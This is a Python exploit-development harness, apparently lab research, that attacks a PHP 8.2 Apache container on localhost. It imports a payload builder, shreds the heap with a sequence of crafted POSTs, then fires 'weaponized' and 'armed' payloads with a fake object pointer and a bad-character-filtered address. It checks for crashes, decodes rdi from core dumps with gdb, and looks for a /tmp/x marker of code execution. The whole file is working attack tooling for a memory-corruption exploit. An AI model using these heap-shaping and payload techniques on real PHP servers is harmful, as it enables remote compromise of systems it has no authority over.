#!/usr/bin/env python3
"""oom118: SHAPE LAW TEST — 98-era sequence replica + values reach corner.

oom117 finding: the exact 98-series weaponized fire on a FRESH boot is
inert (200 + Fatal, no crash). Every 98-era crash came after ~15 prior
fat cycles in the same worker (warm K1S sweep -> sacrifice -> benign x2
-> weaponized). Hypothesis H-SHAPE: the dispatch walk needs the heap
pre-shredded by prior fat cycles in the same child.

Phase 1 (baseline restore): payload68.main() firing sequence verbatim
    (bind-mount conf already active; NO in-container writes/restarts).
    Crash signals: conn-kill per post + 'exit signal Segmentation'
    delta in docker logs + /tmp/core. Decode rdi via two-hop + phpbuild.
Phase 2 (reach test under shaping): recreate -> same shaping sequence
    -> marker post (probe-measure C0) -> B (legal bits) -> ONE armed
    fire = weaponized names + values B,B self-typing run.
    - crash rdi~B / /tmp/x   -> values walked -> chain live
    - crash rdi=0x7a7a4141.. -> names walked, values ignored
    - no crash               -> values presence suppresses names crash
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
VMARK = b"QMARK7XY" * 3
MARK_CELL = VMARK[:16]
STRIDE = 3584
PART = 13
BLK = 0xB8


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def probe_scan(needle, chunk=262144, maxc=8):
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d"
                        % (HOST, needle.hex(), chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out \
                and out.strip() not in ("bad", "ERR open"):
            offs = []
            for line in out.splitlines():
                line = line.strip()
                if not line.startswith("R="):
                    continue
                m = re.search(r"d=((?:0x)?[0-9a-f]+(?: (?:0x)?[0-9a-f]+)*)", line)
                if m:
                    for tok in m.group(1).split():
                        v = int(tok, 16)
                        if v > 0x10000:
                            offs.append(v)
            if offs:
                return offs
        time.sleep(0.7)
    return []


def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()


def ground(tag):
    md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    x = sh("ls /tmp/x 2>&1")
    print("[%s] md5=%s x=%s" % (tag, md5[:8], x[:40]), flush=True)
    return md5 == STOCK_MD5


def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))


def decode_core(tag):
    host_copy = "/tmp/core118_%s" % tag
    c1 = subprocess.run(["docker", "cp", "php_vuln:/tmp/core", host_copy], capture_output=True)
    if c1.returncode != 0:
        print("  core pull FAILED", flush=True)
        return None
    subprocess.run(["docker", "cp", host_copy, "phpbuild:/tmp/core.118_%s" % tag], capture_output=True)
    open("/tmp/g118.gdb", "w").write("set pagination off\nset confirm off\nbt 3\ninfo registers rdi rip\nquit\n")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g118.gdb /tmp/libphp.stock.so /tmp/core.118_%s 2>&1 | grep -E '^rdi|^rip|^-|#[0-2]' | head -8" % tag],
                       capture_output=True, timeout=120)
    out = r.stdout.decode("latin1")
    m = re.search(r"rdi\s+(0x[0-9a-f]+)", out)
    print("  core.%s: rdi=%s" % (tag, m.group(1) if m else "?"), flush=True)
    return m.group(1) if m else None


def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False


def post_mod(body, timeout=300):
    """payload68's own client (exact 98-series transport)."""
    return P.post(body)


def shape_sequence(tag):
    """98-era shaping: warm K1S sweep + sacrifice + benign x2. Returns crash count."""
    n0 = segv_count()
    for k1 in P.K1S[:-1]:
        code, _r = post_mod(P.build_attack(k1, 5000000))
        print("  [%s] warm k1=%d: %s" % (tag, k1, code), flush=True)
    code, _r = post_mod(P.build_attack(3400, 5100000))
    print("  [%s] SACRIFICE: %s" % (tag, code), flush=True)
    for fi in range(2):
        code, _r = post_mod(P.build_attack(3400, 5200000 + fi * 100000))
        print("  [%s] benign%d: %s" % (tag, fi, code), flush=True)
    d = segv_count() - n0
    print("  [%s] shaping done, segv delta=%d" % (tag, d), flush=True)
    return d


def cell_of(addr):
    return struct.pack("<Q", addr) * 2


print("=== oom118: shape-law test (98-era replica + values reach) ===", flush=True)
assert recreate(), "recreate failed"
assert ground("boot"), "md5 not stock"
print("core limits: %s" % sh("cat /proc/1/limits | grep -i 'core file'"), flush=True)

# ---------------- PHASE 1: restore 98-era crash baseline ----------------
print("--- phase 1: 98-era sequence verbatim (weaponized x3 last) ---", flush=True)
shape_sequence("p1")
wpn = []
for fi in range(3):
    t0 = time.time()
    code, resp = post_mod(P.build_attack(3400, 5300000 + fi * 100000,
                                         target_obj=0x414141414141))
    print("  wpn%d: %s (%.1fs) %r" % (fi, code, time.time() - t0, resp[:80]), flush=True)
    wpn.append(code)
time.sleep(2)
delta = segv_count()
print("phase1 segv_total=%d wpn_codes=%s" % (delta, wpn), flush=True)
core_y = sh("test -f /tmp/core && echo y") == "y"
rdi1 = decode_core("p1") if core_y else None
print("PHASE1 VERDICT: crashes=%s core=%s rdi=%s" % (delta, core_y, rdi1), flush=True)
if not delta:
    print("!!! 98-era sequence ALSO inert today - H-SHAPE wrong too; stopping for analysis", flush=True)
    print("=== done ===", flush=True)
    raise SystemExit(0)

# ---------------- PHASE 2: values reach under shaping ----------------
print("--- phase 2: recreate -> shape -> measure -> armed values fire ---", flush=True)
assert recreate(), "recreate2 failed"
assert ground("boot2"), "md5 not stock after recreate"
shape_sequence("p2")
BASE = base_now()
print("base=0x%x" % BASE, flush=True)
mcode, _r = post_mod(P.build_attack(3400, 6100000, target_obj=0x414141414141,
                                    value_tile=MARK_CELL))
print("  marker post: %s" % mcode, flush=True)
offs = probe_scan(VMARK)
assert offs, "marker not found"
C0 = offs[0]
print("C0=0x%x strides=%s" % (C0, [hex(o - C0) for o in offs[1:4]]), flush=True)
VSTART = C0 + STRIDE * PART
B = None
for off in range(0x100, 1536 - BLK - 16):
    cand = VSTART + off
    if cand & 0xF != 8 or (cand >> 8) & 1 != 1 or (cand >> 9) & 1 != 0:
        continue
    nb = cand.to_bytes(6, "little")
    if any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
        continue
    B, OFF = cand, off
    break
assert B, "no legal B"
print("B=0x%x (part %d +0x%x) nib8=%d bit8=%d bit9=%d"
      % (B, PART, OFF, B & 0xF, (B >> 8) & 1, (B >> 9) & 1), flush=True)
t0 = time.time()
acode, aresp = post_mod(P.build_attack(3400, 6200000, target_obj=0x414141414141,
                                       value_tile=cell_of(B)))
print("  ARMED: %s (%.1fs) %r" % (acode, time.time() - t0, aresp[:80]), flush=True)
time.sleep(2)
delta2 = segv_count()
core2 = sh("test -f /tmp/core && echo y") == "y"
rdi2 = decode_core("p2") if core2 else None
xf = sh("cat /tmp/x 2>&1")
print("PHASE2 VERDICT: crashes=%s core=%s rdi=%s x=%s" % (delta2, core2, rdi2, xf[:60]), flush=True)

print("=== SUMMARY ===", flush=True)
print("P1 98-era replica: crashes=%d rdi=%s" % (delta, rdi1), flush=True)
print("P2 shaped+values:  crashes=%d rdi=%s x=%s" % (delta2, rdi2, xf[:40]), flush=True)
print("=== done ===", flush=True)
